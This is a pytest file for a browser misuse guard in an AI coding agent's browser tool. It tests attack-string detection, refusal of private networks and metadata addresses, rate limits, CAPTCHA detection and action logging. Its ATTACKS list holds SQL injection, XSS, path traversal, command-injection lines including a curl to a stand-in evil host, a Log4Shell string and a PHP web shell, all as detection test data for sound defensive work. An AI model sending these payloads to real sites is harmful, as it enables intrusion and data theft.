"""Tests for the browser's misuse protection: attack input, internal networks, rate limits, CAPTCHAs, the
site allowlist and the misuse log. The rules must hold whatever the user says."""

import json
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from types import SimpleNamespace as NS

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
sys.path.insert(0, str(Path(__file__).resolve().parent))

import openai_codex as sdk  # noqa: E402

from codex_app import browser, browser_mcp, config, sessions  # noqa: E402
from codex_app.browser_guard import Blocked, Guard, attack_in, captcha_in  # noqa: E402
from codex_app.config import Settings  # noqa: E402


@pytest.fixture(autouse=True)
def app_home(tmp_path, monkeypatch):
    monkeypatch.setattr(sessions, "APP_HOME", tmp_path / "home")
    monkeypatch.setattr(config, "APP_HOME", tmp_path / "home")


ATTACKS = ["' OR '1'='1", "admin' --", "1 UNION SELECT username, password FROM users", "<script>alert(1)</script>",
           "<img src=x onerror=alert(1)>", "../../../../etc/passwd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
           "; cat /etc/passwd", "| curl http://evil.example/x.sh", "${jndi:ldap://evil/a}", "{{7*7}}",
           "<?php system($_GET[c]); ?>", "1' AND SLEEP(5)--", "javascript:alert(document.cookie)",
           "{{config.items()}}", "x'; DROP TABLE users;--", "%27%20OR%20%271%27%3D%271"]
NORMAL = ["Fix the `login` bug in app.js", "const total = `${price} USD`;", "pets; cat or dog?", "It's #1 in town",
          "Rock 'n' roll", "What is SQL SELECT?", "../images/logo.png", "Tom & Jerry", "{{ user.name }}",
          "Meet me at 5 -- John", "Q&A: how do I use $(document).ready?", "I'd like 2 tickets", "C# or Java?",
          "email me at me@example.com", "Order #1234 - please check", "https://example.com/search?q=shoes&page=2"]


@pytest.mark.parametrize("text", ATTACKS)
def test_attack_strings_are_caught(text):
    assert attack_in(text)


@pytest.mark.parametrize("text", NORMAL)
def test_ordinary_text_and_code_are_fine(text):
    assert attack_in(text) is None


# --- addresses ----------------------------------------------------------------------------------------

@pytest.mark.parametrize("url", ["http://192.168.1.1/", "http://10.0.0.5/admin", "http://169.254.169.254/latest/meta-data",
                                 "http://172.16.3.4:8080/", "http://[fe80::1]/"])
def test_internal_networks_are_refused(url):
    with pytest.raises(Blocked, match="private network|metadata|link-local"):
        Guard().check_url(url)


@pytest.mark.parametrize("url", ["http://localhost:8000/", "http://127.0.0.1:5173/", "https://example.com/"])
def test_this_computer_and_public_sites_are_fine(url):
    Guard().check_url(url)


def test_private_networks_can_be_allowed():
    Guard(allow_private=True).check_url("http://192.168.1.1/")


def test_attack_in_an_address_is_refused():
    with pytest.raises(Blocked, match="SQL injection"):
        Guard().check_url("https://example.com/item?id=1%27%20OR%20%271%27%3D%271")


def test_site_allowlist():
    guard = Guard(allow_sites=("example.com", "mysite.org"))
    guard.check_url("https://example.com/")
    guard.check_url("https://shop.example.com/cart")  # subdomains too
    with pytest.raises(Blocked, match="isn't one of the sites"):
        guard.check_url("https://evil.example.net/")
    with pytest.raises(Blocked, match="isn't one of the sites"):
        guard.check_navigation("https://notexample.com/")  # a redirect or a clicked link
    guard.check_request("https://fonts.example-cdn.com/font.woff")  # a page's own fonts and images still load


# --- rate limits --------------------------------------------------------------------------------------

class Clock:
    def __init__(self):
        self.t = 1000.0

    def __call__(self):
        return self.t


def test_actions_per_minute():
    clock = Clock()
    guard = Guard(now=clock)
    for _ in range(40):
        guard.action("read")
    with pytest.raises(Blocked, match="Too many browser actions"):
        guard.action("read")
    clock.t += 61
    guard.action("read")  # a minute later it's fine again


def test_page_loads_per_site():
    clock = Clock()
    guard = Guard(now=clock)
    for _ in range(20):
        guard.check_url("https://example.com/")
    with pytest.raises(Blocked, match="Too many pages opened on example.com"):
        guard.check_url("https://example.com/")
    guard.check_url("https://other.example.org/")  # other sites aren't held up


def test_submits_per_hour_stop_brute_force():
    clock = Clock()
    guard = Guard(now=clock)
    for _ in range(15):
        guard.check_submit("https://example.com/login")
    with pytest.raises(Blocked, match="Too many submits"):
        guard.check_submit("https://example.com/login")
    clock.t += 3601
    guard.check_submit("https://example.com/login")


def test_typed_text():
    guard = Guard()
    guard.check_typed("Hello, I'd like to book a table for 2.", "https://example.com/")
    with pytest.raises(Blocked, match="SQL injection"):
        guard.check_typed("' OR 1=1 --", "https://example.com/")
    with pytest.raises(Blocked, match="more than 2000"):
        guard.check_typed("x" * 2001, "https://example.com/")


def test_captchas():
    assert captcha_in("Please verify you are human") and captcha_in("", has_widget=True)
    assert not captcha_in("Take the turnstile at the subway entrance")
    with pytest.raises(Blocked, match="CAPTCHA"):
        Guard().check_page("I'm not a robot", "https://example.com/", "click")


# --- the misuse log -----------------------------------------------------------------------------------

def test_every_action_is_logged_without_what_was_typed(tmp_path):
    log = tmp_path / "log.jsonl"
    guard = Guard(log_file=str(log))
    guard.log("type", "https://example.com/form", "16 characters into 'Email'")
    with pytest.raises(Blocked):
        guard.check_typed("<script>steal()</script>", "https://example.com/form")
    entries = [json.loads(line) for line in log.read_text(encoding="utf-8").splitlines()]
    assert entries[0]["site"] == "example.com" and entries[0]["refused"] == ""
    assert entries[1]["action"] == "type" and "script injection" in entries[1]["refused"]
    assert "steal" not in log.read_text(encoding="utf-8")  # the typed text itself is never stored


def test_browser_log_command(tmp_path, capsys):
    import main
    from test_app import FakeCodex
    browser.log_file().parent.mkdir(parents=True, exist_ok=True)
    browser.log_file().write_text(json.dumps({"time": "t", "action": "open", "site": "example.com", "detail": "",
                                              "refused": "SQL injection"}) + "\n", encoding="utf-8")
    app = main.App(FakeCodex({}), sdk, tmp_path, Settings(), "single")
    app.command("/browser log")
    assert "REFUSED" in capsys.readouterr().out


def test_server_config_passes_the_rules(tmp_path):
    cfg = browser.server_config(tmp_path, sites="example.com,mysite.org", allow_private=True)
    assert cfg["args"][cfg["args"].index("--allow-sites") + 1] == "example.com,mysite.org"
    assert "--allow-private" in cfg["args"] and "--log-file" in cfg["args"]


def test_codex_is_told_never_to_attack_sites():
    assert "Never use the browser to attack" in browser.INSTRUCTIONS


# --- a real browser: redirects to an internal network, CAPTCHAs, attack input ----------------------------

class Site(BaseHTTPRequestHandler):
    PAGES = {
        "/": "<html><head><title>Home</title></head><body><a href='/go'>Go</a>"
             "<form method='get' action='/'><input name='q' placeholder='Search'></form></body></html>",
        "/captcha": "<html><head><title>Check</title></head><body><div class='g-recaptcha' data-sitekey='x'></div>"
                    "<button>Continue</button></body></html>",
    }

    def do_GET(self):
        if self.path.startswith("/go"):
            self.send_response(302)
            self.send_header("Location", "http://192.168.0.1/")  # a public page sending the browser inward
            self.end_headers()
            return
        body = self.PAGES.get(self.path.split("?")[0], "<html><body>ok</body></html>").encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *args):
        pass


@pytest.fixture
def real(tmp_path):
    pytest.importorskip("playwright")
    httpd = ThreadingHTTPServer(("127.0.0.1", 0), Site)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    server = browser_mcp.Browser("msedge", headless=True, guard=Guard(log_file=str(tmp_path / "log.jsonl")))
    try:
        server.page()
    except Exception as e:
        httpd.shutdown()
        pytest.skip(f"no browser to drive here: {e}")
    yield server, f"http://127.0.0.1:{httpd.server_address[1]}", tmp_path / "log.jsonl"
    server.close()
    httpd.shutdown()


def call(server, name, **args):
    reply = browser_mcp.handle(server, {"jsonrpc": "2.0", "id": 1, "method": "tools/call",
                                        "params": {"name": name, "arguments": args}})
    return reply["result"]["content"][0].get("text", "")


def ref_of(text, word):
    import re
    return next(int(m.group(1)) for line in text.splitlines() if (m := re.match(r"\[(\d+)\]", line)) and word in line)


def test_real_browser_misuse_rules(real):
    server, base, log = real
    page = call(server, "open", url=base + "/")
    assert "Page: 'Home'" in page
    redirect = call(server, "click", ref=ref_of(page, "Go"))
    assert "192.168.0.1" not in server.page().url  # the redirect inward was stopped
    assert "blocked request" in log.read_text(encoding="utf-8") or "Not done" in redirect
    page = call(server, "open", url=base + "/")
    assert "misuse protection" in call(server, "type", ref=ref_of(page, "Search"), text="' OR '1'='1")
    captcha = call(server, "open", url=base + "/captcha")
    assert "misuse protection" in call(server, "click", ref=ref_of(captcha, "Continue")) and "CAPTCHA" in log.read_text(encoding="utf-8")
